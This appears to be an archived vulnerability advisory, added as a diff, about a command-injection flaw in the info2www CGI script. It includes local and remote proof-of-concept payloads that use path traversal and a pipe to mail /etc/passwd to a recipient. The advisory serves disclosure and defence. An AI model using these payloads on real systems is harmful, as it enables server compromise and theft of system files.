@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/1995/info
+
+The info2www script allows HTTP access to information stored in GNU EMACS Info Nodes. This script fails to properly parse input and can be used to execute commands on the server with permissions of the web server, by passing commands as part of a variable. Potential consequences of a successful exploitation involve anything the web server process has permissions to do, including possibly web site defacement. 
+
+Locally:
+$ REQUEST_METHOD=GET ./info2www '(../../../../../../../bin/mail recipient </etc/passwd|)'
+$
+You have new mail.
+$
+
+Remotely:
+http://targethost/cgi-bin/info2www?(../../../../../../../../bin/mail recipient </etc/passwd|) 
+
+
